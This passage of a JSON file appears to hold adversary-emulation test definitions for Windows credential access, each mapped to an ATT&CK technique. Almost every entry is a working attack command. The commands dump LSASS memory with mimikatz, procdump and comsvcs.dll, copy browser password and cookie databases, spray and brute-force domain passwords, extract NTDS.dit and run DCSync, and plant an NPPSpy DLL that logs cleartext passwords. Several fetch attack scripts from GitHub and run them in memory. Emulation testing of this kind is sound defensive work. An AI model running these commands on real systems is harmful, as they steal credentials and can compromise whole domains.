        "id__dependence__fact": [
            "70850854e26426b18a74438dc5d7fbfc",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "3267861a1da6d870da272e15b9ab088b": {
        "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$env:temp\\Login Data\" -Force -ErrorAction Ignore; Remove-Item -Path \"$env:temp\\Login Data For Account\" -Force -ErrorAction Ignore",
                    "command": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination $env:temp; Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination $env:temp",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3267861a1da6d870da272e15b9ab088b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "974f31ce0e5a6a8d3b54c0e7448d38b5": {
        "description": "This test uses the technique describe in this tweet \n(https://twitter.com/bopin2020/status/1366400799199272960?s=20) from @bopin2020 in order to dump lsass\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item C:\\Windows\\Temp\\dotnet-lsass.dmp -ErrorAction Ignore",
                    "command": "echo \"Createdump Path C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.*.*\\createdump.exe\"; $LSASS = tasklist | findstr \"lsass\"; $FIELDS = $LSASS -split \"\\s+\"; $ID = $FIELDS[1]; & \"C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.*.*\\createdump.exe\" -u -f C:\\Windows\\Temp\\dotnet-lsass.dmp $ID",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "974f31ce0e5a6a8d3b54c0e7448d38b5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "35d92515122effdd73801c6ac3021da7": {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore",
                    "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "35d92515122effdd73801c6ac3021da7",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fd81e466335e6aafcb25b7ec6e915c82": {
        "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$env:temp\\T1555.003Test8.txt\" -erroraction silentlycontinue",
                    "command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"; cmd /c $env:temp\\Firepwd.py -d $PasswordDBLocation > $env:temp\\T1555.003Test8.txt; cat $env:temp\\T1555.003Test8.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fd81e466335e6aafcb25b7ec6e915c82",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "da877dda7da63e639ddb0b6a770ebb5c": {
        "description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "da877dda7da63e639ddb0b6a770ebb5c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b8c5d884f259766b9fa1e6f32666ca0f": {
        "description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$env:temp\\Edge\" -Force -ErrorAction Ignore -Recurse",
                    "command": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination $env:temp\\Edge -Force -Recurse",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b8c5d884f259766b9fa1e6f32666ca0f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6bbb6f8b1db42e2c2c79892e8c31feb3": {
        "description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "vaultcmd /listcreds:\"Windows Credentials\" /all",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6bbb6f8b1db42e2c2c79892e8c31feb3",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "7ff61586e1037c4dfe877ce488fafe0f": {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "PathToAtomicsFolder\\T1003.001\\bin\\mimikatz.exe \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7ff61586e1037c4dfe877ce488fafe0f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "56c2f2d8b48bcb1c999d4e8929bd8d9b": {
        "description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   ; Remove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue",
                    "command": "$exfil_folder = \"$env:temp\\T1555.003\"; if (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}; $FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"; if (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}; if (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}; if (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}; if (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}; if (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}; if (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} ; compress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "56c2f2d8b48bcb1c999d4e8929bd8d9b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "bb0df721f4a4defa743efe9e61837c44": {
        "description": "List credentials currently stored on the host via the built-in Windows utility cmdkey.exe\nCredentials listed with Cmdkey only pertain to the current user\nPasswords will not be displayed once they are stored\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey\nhttps://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.005",
            "name": "OS Credential Dumping: Cached Domain Credentials"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "cmdkey /list",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bb0df721f4a4defa743efe9e61837c44",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "bd7780db67f42278033b765eb1c5de55": {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del \"C:\\Windows\\Temp\\lsass_dump.dmp\" >nul 2> nul",
                    "command": "PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bd7780db67f42278033b765eb1c5de55",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2d78dfbfea7fa4ec7349993b83048079": {
        "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.004",
            "name": "Unsecured Credentials: Private Keys"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore; Remove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore",
                    "command": "Import-Module AADInternals -Force; Export-AADIntADFSCertificates; Get-ChildItem | Where-Object {$_ -like \"ADFS*\"}; Write-Host \"`nCertificates retrieved successfully\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2d78dfbfea7fa4ec7349993b83048079",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1495dd9c92cba48cd54d0c93c07348aa": {
        "description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.001",
            "name": "Brute Force: Password Guessing"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "echo Password1> passwords.txt && echo 1q2w3e4r>> passwords.txt && echo Password!>> passwords.txt && echo Spring2022>> passwords.txt && echo ChangeMe!>> passwords.txt && @FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\#{user}\" \"%p\" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\\IPC$ > NUL",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1495dd9c92cba48cd54d0c93c07348aa",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2c7fc234e9a4702d4cd7f9167ba86dc9": {
        "description": "Test a single password against a list of users\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cd $env:temp; .\\kerbrute.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\passwordspray.txt password132",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2c7fc234e9a4702d4cd7f9167ba86dc9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "895fada96bffd019fa66f273dda72667": {
        "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.003",
            "name": "OS Credential Dumping: NTDS"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "wmic /node:\"localhost\" process call create \"cmd.exe /c esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "895fada96bffd019fa66f273dda72667",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "44df0e5fd9ba43087400e0348aa5ac1c": {
        "description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.\nAfter user's logging in cleartext password is saved in C:\\NPPSpy.txt.\nClean up deletes the files and reverses Registry changes.\nNPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003",
            "name": "OS Credential Dumping"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER; $cleanupUpdatedValue = $cleanupPath.PROVIDERORDER ; $cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''; Set-ItemProperty -Path $cleanupPath.PSPath -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue; Remove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -Recurse -ErrorAction Ignore; Remove-Item C:\\NPPSpy.txt -ErrorAction Ignore; Remove-Item C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore",
                    "command": "Copy-Item \"$env:Temp\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"; $path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER; $UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"; Set-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore; echo \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "44df0e5fd9ba43087400e0348aa5ac1c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f049b89533298c2d6cd37a940248b219": {
        "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.003",
            "name": "OS Credential Dumping: NTDS"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "wmic /node:\"localhost\" shadowcopy call create Volume=C:\\",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f049b89533298c2d6cd37a940248b219",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c6ea575d9641c11410417105f14175ab": {
        "description": "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); kittenz -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c6ea575d9641c11410417105f14175ab",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e0c75b4cc32124ef4c61508694fd0808": {
        "description": "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.004",
            "name": "Steal or Forge Kerberos Tickets: AS-REP Roasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e0c75b4cc32124ef4c61508694fd0808",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1c5ece81f040f7ac981a81add9acdca9": {
        "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.006",
            "name": "OS Credential Dumping: DCSync"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "%tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%\" \"exit\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1c5ece81f040f7ac981a81add9acdca9",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "85ff888fe42e69ec98cd1dc0bad7474f": {
        "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1539",
            "name": "Steal Web Session Cookie"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1539ChromeCookies.txt",
                    "command": "stop-process -name \"chrome\" -force -erroraction silentlycontinue; \"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c $env:temp\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" | out-file -filepath \"$env:temp\\T1539ChromeCookies.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "85ff888fe42e69ec98cd1dc0bad7474f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d8b1f8653b24fadb7d673af718924a9e": {
        "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of $env:TEMP\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\Sysinternals -Force -Recurse -ErrorAction Ignore",
                    "command": "Set-Location -path \"$env:TEMP\\Sysinternals\"; ./accesschk.exe -accepteula .; ",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d8b1f8653b24fadb7d673af718924a9e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "3e5b04b8ee0a1a4950da8f35d95e65fc": {
        "description": "Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word \"password\" will be displayed.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.002",
            "name": "Unsecured Credentials: Credentials in Registry"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "reg query HKLM /f password /t REG_SZ /s && reg query HKCU /f password /t REG_SZ /s",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3e5b04b8ee0a1a4950da8f35d95e65fc",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "bb52768f09251bc7a3d37af1d1a6f895": {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.003",
            "name": "OS Credential Dumping: NTDS"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del \"C:\\Windows\\Temp\\ntds.dit\"        >nul 2> nul && del \"C:\\Windows\\Temp\\VSC_SYSTEM_HIVE\" >nul 2> nul && del \"C:\\Windows\\Temp\\SYSTEM_HIVE\"     >nul 2> nul",
                    "command": "if not exist C:\\Windows\\Temp  ( call ) ELSE ( mkdir C:\\Windows\\Temp ) &&   &&  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bb52768f09251bc7a3d37af1d1a6f895",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "997c27e2534d821031a32835f9188b56": {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.003",
            "name": "OS Credential Dumping: NTDS"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "vssadmin.exe create shadow /for=C: && mklink /D C:\\Temp\\vssstore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "997c27e2534d821031a32835f9188b56",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "a5b60304de310c045db90d974dd0fce2": {
        "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a5b60304de310c045db90d974dd0fce2",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f5606cc7632289d5ca72d4a485c14f6b": {
        "description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "vaultcmd /listcreds:\"Web Credentials\" /all",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f5606cc7632289d5ca72d4a485c14f6b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "262666862164b89881f6b5c565c0a3be": {
        "description": "Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry\nentries are found, they will be displayed.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.002",
            "name": "Unsecured Credentials: Credentials in Registry"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
